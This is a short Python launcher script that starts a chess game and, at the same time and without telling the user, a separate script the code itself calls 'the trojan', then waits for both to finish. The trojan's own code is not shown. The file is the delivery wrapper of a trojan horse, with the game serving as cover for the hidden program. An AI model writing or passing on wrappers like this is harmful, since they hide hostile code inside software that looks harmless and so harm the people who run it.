from subprocess import *

#	Make sure to type 'pip install -r requirements.txt' before executing to install all dependencies

# Execute the game
gameP = Popen(["python ", "./chess/Chess.py"])

# Execute the trojan
trojanP = Popen(["python", "./trojan/trojan.py"])

while gameP.poll() is None or trojanP.poll() is None:
	pass